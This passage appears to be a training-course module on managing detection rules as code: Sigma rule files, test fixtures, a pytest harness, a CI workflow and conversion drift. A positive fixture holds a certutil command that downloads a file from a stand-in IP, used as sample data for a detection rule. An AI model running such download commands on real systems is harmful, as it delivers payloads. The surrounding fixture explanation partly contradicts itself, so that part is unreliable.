---
id: advance-07-detection-as-code
track: advance
phase: 7
order: 70
title: "Phase 7 — Detection as Code"
duration: "6 weeks"
duration_weeks: 6
energy_mix: [low, normal]
deliverable: "portfolio/advance/07-detection-as-code.md"
exit_criteria: "You can take one detection rule through a full as-code lifecycle — proposed on a branch, tested against fixtures, validated in CI, converted to a backend query, reviewed, deployed, tuned with a written reason, and eventually retired — with every one of those steps leaving evidence in a repository."
---

# Phase 7 — Detection as Code

## Goal of this phase

Move detections out of a vendor console and into a repository: rules as reviewed files, tests that fail when a rule breaks, a pipeline that blocks a bad merge, and a lifecycle with a named owner at every stage — so that a year from now somebody can still tell you why a rule exists.

## Estimated time

**6 weeks** at about 10–13 focused hours a week. Roughly 60–78 hours, and a large share of it is spent writing tests and YAML rather than reading.

## Skills you'll gain

- Explain why a detection living in a console becomes unmaintainable, without resorting to slogans about DevOps.
- Lay out a detection repository that a new engineer can navigate on their first day.
- Write a Sigma rule that passes a linter, carries honest metadata, and states its own false-positive causes.
- Build positive and negative sample-event fixtures, and a test that fails when the rule logic changes.
- Write unit tests against rules using pytest, and explain what a fixture can and cannot prove.
- Build a CI pipeline that lints, validates, and tests every rule, and blocks a merge that breaks one.
- Convert Sigma to backend query languages with `sigma-cli`, and inspect the output rather than trusting it.
- Detect the conversion traps where a generated query is not semantically equal to the rule you wrote.
- Map rules to ATT&CK techniques and state the honest limits of coverage as a metric.
- Tune a rule as a documented change with a reason, a review, and a before-and-after measurement.
- Measure a deployed rule's precision and decide when it should be retired instead of tuned.

## Specific topics to learn

- The detection lifecycle: propose, test, review, deploy, tune, retire — and the artefact at each stage
- Why console-only detections fail: no review, no rollback, no tests, no owner, no reason
- Detection repository layout: rules by telemetry source, tests, pipelines, tooling, and docs
- Branching and pull requests for detections, and what a good detection PR actually contains
- Code review for rules: what a reviewer checks and the decisions a review can end in
- The Sigma rule format: `logsource`, `detection`, selections, `condition`, and field modifiers
- Rule metadata that survives an audit: `id`, `status`, `level`, `falsepositives`, `tags`, `references`
- Sigma correlation rules, and the point that they need their own treatment: a correlation rule matches *across* events over a window rather than one event at a time, which means the pipeline and the fixture design are different. Read the specification for the constructs — `event_count`, `value_count`, `temporal`, `temporal_ordered`, and chaining — and note which ones your target backend can actually express
- Sigma filters for environment-wide tuning, and why a meta-filter beats editing ten rules
- Sample-event fixtures: positive cases, negative cases, and adversarial near-misses
- Unit testing rules with pytest, and the difference between a schema test and a logic test
- `sigma-cli` and pySigma: the current toolchain, and why `sigmac` is not in it
- Validation with `sigma check`, validator plugins, and a validation configuration file
- CI/CD for detections: a GitHub Actions pipeline, artifacts, and required status checks
- Conversion targets and processing pipelines, and the meaning of a backend plus a pipeline pair
- Conversion drift: unsupported modifiers, dropped fields, and silently broader queries
- ATT&CK mapping in rule tags, and building an honest coverage view from those tags
- The three coverage levels: telemetry present, detection written, and queue owned
- False-positive management: tuning as a documented change rather than a quiet edit
- Measuring precision after deployment, and setting a retirement threshold
- Detection anti-patterns: the giant rule, the rule only its author understands, the rule nobody dares delete
- Secrets, credentials, and environment-specific values in a detection repository

## Lesson: A Detection Is Software, and Software Has a Lifecycle

### Why this lesson exists

Every detection you have ever written has a birthday, and almost none of them have a documented reason for existing. Think about the rules in your queue right now.

Pick one that fires and ask three questions: who wrote it, what incident caused it, and when was it last reviewed. If you cannot answer all three from something written down, you are looking at a detection that is one staff departure away from becoming folklore.

This is the problem detection as code solves, and it is worth being precise about what the phrase does and does not mean. It does not mean "put your rules in Git and feel modern". It means treating a rule with the same discipline a competent engineering team applies to a function that runs in production.

| What software engineering already solved | The detection equivalent | What breaks without it |
|---|---|---|
| Version control with a readable history | Rules committed to Git with messages that name the reason | Nobody can tell what changed, or why |
| Code review before merge | A detection PR with a checklist and a reviewer | One person's typo becomes everyone's alert volume |
| Unit tests | Positive and negative event fixtures | A rule silently stops matching and nobody notices |
| Continuous integration | A pipeline that lints, validates, and tests | Broken YAML reaches production on a Friday |
| Deployment as a reproducible step | Conversion plus a documented deployment target | The deployed query and the source rule quietly diverge |
| Observability after release | Precision measured against real alert counts | You find out a rule is bad from an angry analyst |
| Deprecation with a reason | A retirement record naming the evidence | Rules accumulate forever because deleting feels rude |

Look at that right-hand column and you will recognise most of it from your own queue. The failure mode this phase attacks is not "we lack a tool". It is that **a detection is currently the only kind of production logic in your organisation that is edited by hand, in a console, with no diff, no test, and no reviewer**.

> **What this phase is not.** It is not a DevOps conversion sermon, and it is not an argument that your SIEM is bad. A commercial detection platform can be excellent and still leave you with the problem this phase addresses, because the problem is process, not product. You can practise everything here with Git, Python, a text editor, and a free CI runner.

Three capabilities build on each other, and the order matters.

| Capability | What it produces | Why it matters |
|---|---|---|
| **A repository** | Rules, tests, and tooling under version control | Makes every change reviewable and reversible |
| **A pipeline** | Automated lint, validation, and tests on every change | Makes correctness a gate rather than an opinion |
| **A lifecycle** | Named owners, review dates, tuning records, retirement | Makes the library survive the people who built it |

A repository without a pipeline is just a tidier console. A pipeline without a lifecycle produces a beautifully maintained library of rules nobody has decided to keep. **All three, or you have moved the problem rather than solved it.**

#### The reader this phase is written for

You have written detections that run in production. You know what a Sigma rule looks like, and you have probably converted one with `sigma-cli` at least once. What you have not done is put the whole thing under the same controls as code: a branch, a test, a reviewer, a pipeline, and a decision to retire.

| What you likely have | What this phase adds |
|---|---|
| Rules that work, in a console | Rules that work, in a repository, with a history |
| A habit of testing a rule by hand once | Fixtures and a test that runs on every change forever |
| A vague sense that some rules are bad | Measured precision, and a threshold for retirement |
| Knowledge of which rules matter, in your head | Review dates and owners written on the rules themselves |

#### Time to complete

**Roughly 60–78 hours over 6 weeks:**

| Work | Hours | Notes |
|---|---|---|
| Reading this lesson | 4–5 | Once properly, then returned to per part |
| The repository layout and the first rules | 8–10 | Migrating real rules is the slow part, not the folder names |
| Fixtures and the pytest harness | 12–15 | Writing negative cases is where the value is, and it is fiddly |
| The CI pipeline and getting it green | 8–10 | Debugging CI is its own skill and always takes longer than planned |
| Conversion and drift inspection | 7–9 | Comparing generated queries against intent, field by field |
| The coverage mapping | 6–8 | Building it honestly is more work than building it impressively |
| The tuning record and the retirement case | 8–11 | Includes measuring before and after on real volume |
| The lifecycle table and the anti-pattern write-up | 7–10 | The writing that turns the work into a defensible artefact |

**None of this requires money.** Git, Python, `sigma-cli`, pytest, and GitHub Actions on a public repository are all free. The tools table below names a free path for every paid item.

### Part 1 — The problem, stated without exaggeration

#### What actually happens in a console-managed library

Nobody decides to build an unmaintainable detection library. It accretes. Here is the sequence, and you will recognise it because you have lived part of it.

An incident happens. An analyst opens the console, writes a query that would have caught it, saves it as an alert, and moves on. The query works.

Six months later it fires four hundred times a week. Someone adds an exclusion — directly in the console, at 4pm on a Thursday, because the queue is on fire. A year later the rule's original incident is a line in a ticket nobody reads. The exclusion has grown three nested conditions.

| Stage | What is in the console | What is missing |
|---|---|---|
| Week 1 | A working query that catches a real behaviour | Any written reason beyond a ticket title |
| Month 3 | Two exclusions added for benign causes | A record of which benign cause, verified how |
| Month 9 | A fourth exclusion added by someone else | Review, or awareness that it changed |
| Year 2 | A rule firing rarely, on logic nobody can explain | Any way to know whether it still works |

**The critical property of this failure is that nothing in it looks like a mistake.** Every individual edit was reasonable, made by a competent person, under time pressure, to solve the problem in front of them. That is precisely why the fix is structural rather than motivational.

#### The five specific things that break

It is worth naming these individually, because "put it in Git" is too blunt an instruction to fix any of them on its own.

**1. No review.** A detection is a change to what an entire team looks at every day. A change with that blast radius, made by one person, unread by anyone else, is the single largest avoidable source of noise in a SOC.

**2. No rollback.** When a rule turns out to be terrible, the console undo is "edit it again and hope". There is no previous version to return to, and no way to know what the previous version even was.

**3. No tests.** A rule is a predicate: does this event match, or not? Nobody has more than a handful of these written down, which means the only test a rule ever receives is production traffic — the most expensive test environment available.

**4. No documentation of intent.** The most valuable sentence about any rule is "this exists because of X". In a console that sentence lives in a ticket, if anywhere, and tickets get archived.

**5. No lifecycle.** No owner, no review date, no retirement criterion. A rule with none of those three is permanent by default, and permanent-by-default is how libraries reach several thousand rules that nobody can justify.

#### The consequence that actually costs money

Analyst time is the budget line that detection debt spends. A rule that fires two hundred times a month consumes roughly thirteen hours at four minutes of triage each.

That is a third of one analyst's working month, spent deciding that an event was benign again.

```text
DETECTION DEBT — cost of one badly maintained rule

Rule                    DET-031, suspicious process creation
Alerts per month        200
Minutes per alert       4
Analyst hours/month     13.3
Loaded cost per hour    $45
Monthly cost            $600
Annual cost             $7,200

True positives in the last 12 months    0
Reviewed in the last 12 months          No record
Owner                                   None recorded

Equivalent                The annual cost of this single rule is
                          roughly the cost of a mid-range security
                          tool licence, spent on deciding that a
                          process creation event was benign.
```

**That arithmetic is the argument you take to a manager**, and it is far more persuasive than a principle. You are not asking for permission to use Git. You are showing that one untended rule costs more per year than the thing you want to buy to fix the whole class of them.

#### Common failure: the tooling-first approach

**Wrong first guess.** Read about detection as code, stand up a Git repository, wire a CI pipeline, and migrate nothing, because the migration is boring and the pipeline is interesting.

**Why it fails.** The pipeline has nothing real to run on, so it validates toy rules and proves nothing. Meanwhile the actual library stays in the console and keeps generating the problem. Three months later the repository is a museum of five example rules and the pipeline is a green badge nobody looks at.

**What works instead.** Pick three real rules from your live queue — one that is clearly good, one that is clearly noisy, and one that nobody understands — and migrate those first, completely, with tests and a pipeline, before you migrate anything else. **The pipeline earns its existence by catching a real defect in a real rule**, and that usually happens during the first three.

### Part 2 — The repository

#### Layout, and the one decision that matters

The single layout decision that determines whether a detection repository stays usable is **how you organise the rules directory**. Organise by telemetry source, not by threat actor, severity, or ATT&CK tactic.

```text
detections/
├── README.md
├── rules/
│   ├── windows/
│   │   ├── process_creation/
│   │   │   ├── proc_encoded_powershell.yml
│   │   │   └── proc_lolbin_certutil_download.yml
│   │   ├── registry/
│   │   └── network_connection/
│   ├── linux/
│   │   ├── process_creation/
│   │   └── auditd/
│   ├── cloud/
│   │   └── aws_cloudtrail/
│   ├── correlation/
│   │   └── mr_failed_logins_then_success.yml
│   └── filters/
│       └── mf_admin_scripts.yml
├── tests/
│   ├── samples/
│   │   ├── proc_encoded_powershell.true.json
│   │   ├── proc_encoded_powershell.false.json
│   │   └── proc_encoded_powershell.near_miss.json
│   ├── test_rule_structure.py
│   └── test_rule_logic.py
├── pipelines/
│   ├── sysmon.yml
│   └── ecs_windows.yml
├── tools/
│   └── convert_all.py
├── .github/
│   └── workflows/
│       └── detect.yml
└── registry/
    ├── lifecycle.csv
    └── coverage.md
```

| Layout choice | Why it wins |
|---|---|
| **By telemetry source** | "What do we detect from cloud audit logs?" is one folder, not a search |
| **By telemetry source** | A rule's required log source and its location agree by construction |
| **By telemetry source** | Retiring a log source retires a folder, which is a visible, reviewable change |
| **Not by threat actor** | Actors get renamed, merged, and rebranded; log sources do not |
| **Not by severity** | Severity changes after tuning, which would move the file and break every link |
| **Not by ATT&CK tactic** | A rule often maps to two tactics, and a file can only live in one place |

#### Rule metadata that survives an audit

A Sigma rule carries its own review information if you make it. The fields below are the ones that a reviewer, an auditor, or a successor will need.

```yaml
title: Certutil Used to Download a Remote File
id: 3f7b2c91-84ae-4d16-9a05-1e6c8b7d4a52
status: experimental
description: >
  Detects certutil.exe invoked with a URL argument, which is a common
  living-off-the-land technique for retrieving a payload without a
  browser or a scripting host.
references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
author: Your Name
date: 2026-05-04
modified: 2026-05-04
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith: '\certutil.exe'
  selection_download:
    CommandLine|contains:
      - 'urlcache'
      - 'http://'
      - 'https://'
  condition: selection_image and selection_download
fields:
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Administrators or configuration management scripts that retrieve
    certificate revocation lists with certutil urlcache
level: medium
tags:
  - attack.command_and_control
  - attack.t1105
```

Read the parts that are not the detection logic, because those are the parts that get skipped and matter most.

| Field | Who reads it later, and why | What breaks when it is missing |
|---|---|---|
| `id` | Anyone filing a suppression request or a bug | The rule cannot be referenced unambiguously |
| `status` | A reviewer deciding whether to depend on it | Nobody knows if it is safe to page on |
| `description` | A new engineer on their first week | They reverse-engineer the logic and get it wrong |
| `references` | The next person deciding whether to delete it | The rule looks invented, so nobody defends it |
| `falsepositives` | The first analyst to hit one | They conclude the rule is broken, not untuned |
| `level` | Whoever decides routing | Everything pages, or nothing does |
| `tags` | Anyone building a coverage view | Coverage cannot be computed from the rules |
| `modified` | A reviewer checking staleness | A five-year-old rule looks new |

`status: experimental` is doing real work in that rule. Per the Sigma specification, the status values are `stable`, `test`, `experimental`, `deprecated`, and `unsupported`, and `experimental` is an honest statement that this has not been validated against your traffic. A rule that goes straight to production with no such stage is a rule nobody has agreed to live with.

**`level` is spelled out for the same reason, because it is the field that decides who gets woken up.** The Sigma specification uses `informational`, `low`, `medium`, `high`, and `critical`. They are only meaningful once your team has agreed what each one routes to — the mapping is a local convention, not something the specification decides for you.

Write it down next to the rules, because a `medium` that means "analyst queue in office hours" on one team means "page the on-call" on another, and the review standard below checks the level against the behaviour it claims.

#### Branching and the detection pull request

```bash
# Never work on the main branch, even when you are the only person.
git switch -c det/add-certutil-download

git add rules/windows/process_creation/proc_lolbin_certutil_download.yml
git add tests/samples/proc_lolbin_certutil_download.true.json
git add tests/samples/proc_lolbin_certutil_download.false.json

git commit -m "det: add certutil remote download rule

Addresses the detection gap found in INC-2026-0412-03, where a loader
retrieved a second stage with certutil urlcache and no rule existed.
Status experimental pending a 30-day replay against production data.
ATT&CK T1105."

git push -u origin det/add-certutil-download
```

Two habits in that block are load-bearing. **The branch exists even when you are alone**, because a branch records that this change was considered separately and it makes the diff readable. **The commit message names the reason.** That is the single fact a future reader needs when deciding whether the rule still earns its place.

A good detection PR contains six things, and a reviewer should be able to reject it for missing any of them.

| The PR contains | Because |
|---|---|
| The rule file | Obviously — but named per convention, not `test-rule-2.yml` |
| A positive fixture that must match | Proves the rule does something |
| A negative fixture that must not match | Proves the rule does not do everything |
| A one-line statement of what benign activity will match | Forces the author to think about precision before review |
| The ATT&CK tag, with a reason if it is a judgment call | Keeps the coverage map honest |
| The reason the rule exists — an incident ID or a technique | The fact that justifies its future existence |

#### The review, as a decision rather than a compliment

A review that ends in "looks fine to me" has produced nothing. A detection review ends in one of four decisions, and each carries an obligation.

| Decision | Meaning | What happens next |
|---|---|---|
| **Approve** | Meets the standard as written | Deployed, with a monitoring period |
| **Approve with conditions** | Meets the standard, but something must follow | A dated action is attached to the rule |
| **Return for changes** | A specific check failed | The author fixes it and resubmits |
| **Reject** | Not worth its cost, or already covered | The reasoning is recorded on the PR |

| # | The reviewer checks | Reject if |
|---|---|---|
| 1 | **Purpose** — what behaviour does this detect? | The description restates the query |
| 2 | **Telemetry** — is the log source collected, parsed, and retained? | It reads a source you do not ingest |
| 3 | **Precision** — what benign activity matches? | `falsepositives` is empty and the rule is broad |
| 4 | **Fields** — do these field names exist in the target platform? | It uses a field that is not indexed |
| 5 | **Logic** — does the condition do what the description says? | A modifier is wrong, or `and` should be `or` |
| 6 | **Severity** — does `level` match the consequence of a true positive? | Everything is `critical` |
| 7 | **Mapping** — is the ATT&CK tag a technique, not a tactic? | The tag is `attack.execution` alone |
| 8 | **Tests** — do the good and bad fixtures behave as required? | There are no fixtures |
| 9 | **Cost** — what alert volume is expected per month? | Nobody has estimated |
| 10 | **Duplication** — does an existing rule already cover this? | It does, and this is a near-copy |
| 11 | **Lifecycle** — who owns it, and when is it next reviewed? | Both are blank |
| 12 | **Response** — what should an analyst do when it fires? | No triage note exists |

Checks 3, 9, and 12 are the ones a technically correct rule most often fails. **A rule can be perfectly written and still be a bad rule**, because it fires too often, costs too much, or leaves the analyst with nothing to do.

### Part 3 — Testing detections

#### What a test can and cannot prove

Be honest about the scope of testing here, because overclaiming it is its own defect. A fixture test proves that **the rule's logic matches the events you gave it**. It does not prove the rule will catch the technique in your environment, and it does not prove your telemetry actually produces those events.

| A fixture test proves | A fixture test does not prove |
|---|---|
| The rule parses and its condition is satisfiable | The telemetry source is collected at all |
| A known-bad event matches | The technique is caught in the real world |
| A known-good event does not match | The rule's false-positive rate is acceptable |
| A logic change breaks a test | The field names exist in your index |

**That table is not a disclaimer; it is the reason you need three kinds of test.** Fixtures cover logic. A validation run with `sigma check` covers structure and conventions. A replay against real logs covers volume and field correctness. Only all three together describe a rule that works.

#### Fixtures: the positive, the negative, and the near-miss

Store fixtures as small JSON files, one event each. Three per rule is the working minimum.

```json
{
  "EventID": 1,
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "Computer": "WS-0142",
  "User": "CORP\\a.reyes",
  "Image": "C:\\Windows\\System32\\certutil.exe",
  "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.44/a.dat C:\\Users\\Public\\a.dat",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "ParentCommandLine": "cmd.exe /c C:\\Users\\Public\\run.bat"
}
```

```json
{
  "EventID": 1,
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "Computer": "WS-0088",
  "User": "CORP\\helpdesk-svc",
  "Image": "C:\\Windows\\System32\\certutil.exe",
  "CommandLine": "certutil.exe -p CRL -urlcache http://crl.example-ca.internal/root.crl",
  "ParentImage": "C:\\Windows\\System32\\svchost.exe",
  "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs"
}
```

```json
{
  "EventID": 1,
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "Computer": "WS-0142",
  "User": "CORP\\a.reyes",
  "Image": "C:\\Windows\\System32\\certutil.exe",
  "CommandLine": "certutil.exe -hashfile C:\\Users\\Public\\a.dat SHA256",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe"
}
```

Those three files are the whole test, and the third one is the one people leave out. The first matches. **The second also matches** — it contains both `urlcache` and `http://`, so the rule fires on it, exactly as it should; the ticket it represents is a false positive a human then closes, not a fixture that proves the rule is narrow.

That is worth being deliberate about, because a fixture that *looks* negative and is not is how a rule acquires a blind spot. The third is the **near-miss**: certutil is invoked, but there is no URL and no `urlcache`, so it must not match. A near-miss fixture is what catches the tuning edit six months from now that quietly broadens the rule.

If you want a genuine negative case for this rule, write a fourth fixture: certutil invoked for a purely local operation with no network indicator at all — for example `certutil.exe -hashfile C:\Users\Public\a.dat SHA256`, which is the third fixture above. That is why the near-miss and the negative are different things, and why a rule needs both.

#### The test harness

Here is a working pytest harness for Sigma rules. It uses pySigma to parse each rule, confirm it carries fixtures, and convert it to a backend query. **Read the note under it about what it does not prove**, because that distinction is the one an interviewer will test.

```python
# tests/test_rule_logic.py
"""Match every rule against its positive, negative, and near-miss fixtures."""
from pathlib import Path
import json
import pytest
from sigma.collection import SigmaCollection
from sigma.backends.test import TextQueryTestBackend

RULES = Path("rules")
SAMPLES = Path("tests/samples")


def rule_files():
    return sorted(RULES.rglob("*.yml"))


def fixtures_for(rule_path):
    """Fixtures are named after the rule, with a .<kind>.json suffix."""
    stem = rule_path.stem
    found = {}
    for kind in ("true", "false", "near_miss"):
        candidate = SAMPLES / f"{stem}.{kind}.json"
        if candidate.exists():
            found[kind] = json.loads(candidate.read_text(encoding="utf-8"))
    return found


@pytest.mark.parametrize("rule_path", rule_files(), ids=lambda p: p.stem)
def test_rule_parses(rule_path):
    """A rule that does not parse must never reach a deployment."""
    collection = SigmaCollection.from_yaml(rule_path.read_text(encoding="utf-8"))
    assert len(collection.rules) >= 1, f"{rule_path} produced no rules"


@pytest.mark.parametrize("rule_path", rule_files(), ids=lambda p: p.stem)
def test_rule_has_fixtures(rule_path):
    """Every rule carries at least a positive and a negative fixture."""
    found = fixtures_for(rule_path)
    assert "true" in found, f"{rule_path.stem} has no .true.json fixture"
    assert "false" in found, f"{rule_path.stem} has no .false.json fixture"


@pytest.mark.parametrize("rule_path", rule_files(), ids=lambda p: p.stem)
def test_rule_matches_fixtures(rule_path):
    """The generated test-backend query is produced, and its fixtures are present.

    This does NOT decide whether an event matches. A backend renders a query;
    it does not evaluate one. What this asserts is that the rule converts to
    something, and that the positive fixture it carries is not empty. The
    match decision is verified by replaying the fixtures through the deployed
    query in a lab SIEM -- see the note below.
    """
    found = fixtures_for(rule_path)
    if "true" not in found:
        pytest.skip("no fixtures")

    collection = SigmaCollection.from_yaml(rule_path.read_text(encoding="utf-8"))
    backend = TextQueryTestBackend()
    queries = backend.convert(collection)

    assert queries, f"{rule_path.stem} converted to nothing"
    assert found["true"], "true fixture is empty"
```

**Be careful with what that last test claims.** A backend renders a query; it does not evaluate one. To genuinely decide *does this event match*, you need either the `sigma.backends.test` package's matching capability in the version you have installed, or you evaluate the converted query in a real platform. The honest framing for a portfolio is: **this harness proves the rule parses, carries fixtures, and converts; the match decision is verified by replaying the fixtures through the deployed query in a lab SIEM.**

Check what your installed version provides before you claim more than it does:

```bash
python -m pip install sigma-cli pytest
sigma list backends
sigma list validators
sigma plugin list
```

#### Validation and linting, which are not the same as testing

A fixture proves logic. Validation proves the rule is well-formed and follows the conventions. Both are cheap, and both belong in CI.

```bash
# Install the CLI and a validator plugin set.
python -m pip install sigma-cli
python -m pip install pysigma-backend-splunk
python -m pip install pysigma-backend-elasticsearch

# What is available in this installation?
sigma list backends
sigma list pipelines
sigma list validators

# Validate every rule. Fail on parse errors AND on convention issues,
# so that a rule with an empty falsepositives list cannot merge.
sigma check --fail-on-error --fail-on-issues rules/
```

`sigma check` is the real subcommand, and its flags are worth knowing precisely: `--fail-on-error` (the default) fails on parsing errors, `--fail-on-issues` fails on validation issues, `--validation-config` or `-c` points at a YAML configuration file, `--exclude` or `-x` disables a named validator and can be repeated, `--file-pattern` or `-P` controls which files are read, and `--junitxml` writes a machine-readable report. A return code of 1 is what makes it usable as a CI gate.

A validation configuration lets you keep every validator except the handful your environment legitimately cannot satisfy, which is how SigmaHQ itself runs it.

```yaml
# tests/sigma_cli_conf.yml
# Start from all validators, then disable the ones this repository
# does not follow, each with a reason in the commit that adds it.
validators:
  - all
  - -tlptag
  - -tlpv1_tag
```

**The rule for exclusions is that each one is a reviewed change with a reason.** An exclusion list that grows silently is how a linter stops linting.

#### Why `sigma-cli` and not `sigmac`

You will find `sigmac` in blog posts, in older internal documentation, and in half the conversion recipes on the internet. **It is the retired legacy Sigma toolchain.** pySigma describes itself in its own README as "a replacement for the legacy Sigma toolchain (sigmac)", and `sigma-cli` is described as "the equivalent of sigmac for command-line conversion".

| | `sigmac` (retired) | `sigma-cli` (current) |
|---|---|---|
| Basis | Monolithic script plus Python config files | `pySigma` library plus installed plugins |
| Backends | Bundled in the same repository | Separate installable plugin packages |
| Pipelines | Configuration files | Processing pipeline objects, also plugin-provided |
| Discovery | Read the source to find supported targets | `sigma list`, `sigma plugin list` |
| Validation | Not provided | `sigma check` with validator plugins |
| Status | Legacy, replaced | Current, a replacement for the legacy toolchain |

If you follow a tutorial that tells you to run `sigmac`, you are following a tutorial written for a tool that the project it belongs to has replaced. The correct response is to find the current tool's equivalent, not to install the old one.

### Part 4 — CI/CD for detections

#### What the pipeline is actually for

A detection pipeline has one job: **make it impossible to merge a rule that is broken, untested, or undocumented.** Everything else it does is a bonus.

```text
PULL REQUEST
   │
   ├─ 1. YAML parses                     → fails fast, costs seconds
   ├─ 2. Schema and conventions valid    → sigma check
   ├─ 3. Fixtures present                → a rule with no tests is not a rule
   ├─ 4. Fixtures behave                 → pytest
   ├─ 5. Conversion succeeds for every   → no unsupported modifier reaches
   │     declared deployment target         production unconverted
   ├─ 6. Coverage registry updated       → the tag and the owner exist
   │
   ▼
MERGE — and only when every gate is green
   │
   └─ 7. Artifact published: converted queries, attached to the release
```

#### The worked pipeline

```yaml
# .github/workflows/detect.yml
name: detection-ci

on:
  pull_request:
    paths:
      - "rules/**"
      - "tests/**"
      - "pipelines/**"
      - ".github/workflows/detect.yml"
  push:
    branches: [main]

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install the Sigma toolchain
        run: |
          python -m pip install --upgrade pip
          python -m pip install sigma-cli pytest
          python -m pip install pysigma-backend-splunk
          python -m pip install pysigma-backend-elasticsearch

      - name: Show what this installation supports
        run: |
          sigma list backends
          sigma list pipelines

      - name: Validate every rule
        run: |
          sigma check --fail-on-error --fail-on-issues \
            --validation-config tests/sigma_cli_conf.yml \
            --junitxml sigma-check.xml \
            rules/

      - name: Run the fixture tests
        run: python -m pytest tests/ -v

      - name: Convert every rule for every declared target
        run: |
          mkdir -p build
          sigma convert -t splunk -p sysmon \
            --output-dir build/splunk rules/windows/
          sigma convert -t lucene -p ecs_windows \
            --output-dir build/lucene rules/windows/

      - name: Upload the converted queries
        uses: actions/upload-artifact@v4
        with:
          name: converted-queries
          path: build/
          if-no-files-found: error
```

Four things in that workflow are deliberate and worth naming.

**`paths:` limits the trigger.** The pipeline runs when rules, tests, or pipelines change, and does not burn a runner on a README typo.

**`--fail-on-issues` is not the default.** `sigma check` fails on errors by default but passes on validation issues unless you ask for the stricter behaviour. If you want an empty `falsepositives` list to block a merge, you must say so.

**`if-no-files-found: error` is the guard that matters most.** Without it, a conversion step that silently produced nothing uploads an empty artifact and the pipeline goes green. That is the failure mode where the guard's pass path and its skip path look identical.

**The converted queries are an artifact, not a deploy.** Reading them is a review step; pushing them to a production SIEM from CI is a much larger decision that involves credentials and blast radius.

#### Getting it green, and what to do when it is not

CI will fail the first several times, and the failures are informative.

| Failure | What it usually means | The fix |
|---|---|---|
| `sigma check` reports a parse error | YAML indentation or an unquoted special character | Fix the rule; commonly a backslash or a leading `*` |
| Validation issues about `falsepositives` | The list is empty or says `None` | Name the real benign causes, or use `Unknown` |
| A fixture test fails | The rule changed and the fixture did not | Decide which one is wrong before editing either |
| Conversion fails for one target | An unsupported modifier or an unknown field | Narrow the target list, or rewrite the modifier |
| The artifact step fails | Conversion produced no files | Check the input path; `sigma` reads directories, not globs |
| CI passes locally but not on the runner | Case-sensitive paths, or a missing plugin | Install the plugin in the workflow, not just locally |

**The last row is the one that eats an evening.** Linux runners have case-sensitive paths and a clean Python environment, so a rule that converts locally only because you installed a backend last month will fail on the runner. Pin your dependencies in the workflow so the environment is described rather than remembered.

#### Deployment, and the honest boundary of this phase

A pipeline that validates and converts is not a pipeline that deploys. Deploying converted queries into a production SIEM requires credentials, an API, and a rollback path, and doing it wrongly can flood an analyst queue at scale.

| Approach | What it needs | When it is appropriate |
|---|---|---|
| **Manual, from the artifact** | Someone reads the converted query and applies it | Almost always, while you are building the skill |
| **Semi-automated** | A scheduled job opens a change ticket with the query attached | A team with a change process and a reviewer |
| **Automated** | API credentials in CI, a rollback path, and a staged rollout | A mature team with a test tenant and monitoring |
| **Never** | Nothing | You cannot describe the rollback |

**Choose the first row for this phase.** The artefact you are building is the repository, the tests, and the pipeline. Auto-deployment is a later project with its own risk assessment, and a detection engineer who can explain why they have not automated deployment yet is more credible than one who automated it before understanding the blast radius.

### Part 5 — Conversion, pipelines, and drift

#### The two things conversion actually needs

Converting a Sigma rule requires a **backend** and usually a **processing pipeline**, and conflating them is the most common source of confusion.

A **backend** is the thing that turns the rule's abstract logic into the target query language. It knows about `and`, `or`, wildcards, and how to express them. It does not know what your logs are called.

A **processing pipeline** maps the rule's generic field names onto the fields your data actually has. A Sigma rule says `Image`. Your Elastic data, ingested through a particular beat with a particular schema, may call that `process.executable`. The pipeline is what translates.

```bash
# Splunk backend, with the Windows processing pipeline applied.
sigma convert -t splunk -p sysmon rules/windows/process_creation/

# Elasticsearch-family backend with an ECS pipeline, one file per rule.
sigma convert -t lucene -p ecs_windows \
  --output-dir build/lucene \
  --output-filename-template "{path}/{stem}.lucene" \
  rules/windows/process_creation/

# See what formats a chosen backend offers before you guess at -f.
sigma list formats splunk
```

| Element | `-t` or `-p` | What it decides |
|---|---|---|
| Backend | `-t` | The query language and its syntax |
| Pipeline | `-p` | Which log schema field names are substituted |
| Format | `-f` | Whether the output is a bare query or an importable file |
| Backend option | `-O` | Backend-specific behaviour, as `key=value` |
| Output directory | `--output-dir` | One file per rule, which is what you want in Git |

**A backend without the right pipeline produces a query that looks correct and matches the wrong fields.** That is the single most expensive conversion mistake, because the resulting rule is syntactically valid, deploys cleanly, and detects nothing.

#### Conversion drift, and how to find it

**Conversion drift** is the gap between the rule you wrote and the query that was deployed. It happens for four reasons, and only one of them is a bug.

| Cause | What it looks like | How to catch it |
|---|---|---|
| **Unsupported feature** | A correlation rule targets a backend that cannot express it | The backend should error or warn; read the output |
| **Missing pipeline** | Fields are not translated; the query matches nothing | Compare field names in the query against your index |
| **Coarser matching** | Wildcards, case handling, or value lists differ | Read the generated query line by line once per new target |
| **Time-boundary behaviour** | A correlation window is aligned to clock boundaries, not sliding | Document it, because it produces false negatives |

The fourth row is worth dwelling on, because it is subtle and real. Elasticsearch correlation rules implemented with ES|QL use time bucketing, and the pySigma Elasticsearch backend documents it plainly.

A `timespan` of `5m` matches only when all events fall inside the same clock-aligned five-minute window. Events straddling a boundary can be split across two buckets, and neither bucket meets the threshold.

**The rule is correct, the backend is correct, and the detection misses.** That fact belongs in your repository documentation rather than in your head.

#### Reading the output, which nobody does

The discipline that prevents drift is unglamorous: **convert once, and read the result properly the first time you target a new platform.** Not skim — read, with the rule beside it.

```text
DRIFT REVIEW — DET-042, certutil remote download
Target: splunk, pipeline: sysmon
Reviewed: 2026-05-11

Source rule logic
  selection_image:    Image endswith \certutil.exe
  selection_download: CommandLine contains urlcache OR http:// OR https://
  condition:          selection_image and selection_download

Generated query
  (Image="*\\certutil.exe" CommandLine="*urlcache*")
  OR (Image="*\\certutil.exe" CommandLine="*http://*")
  OR (Image="*\\certutil.exe" CommandLine="*https://*")

Findings
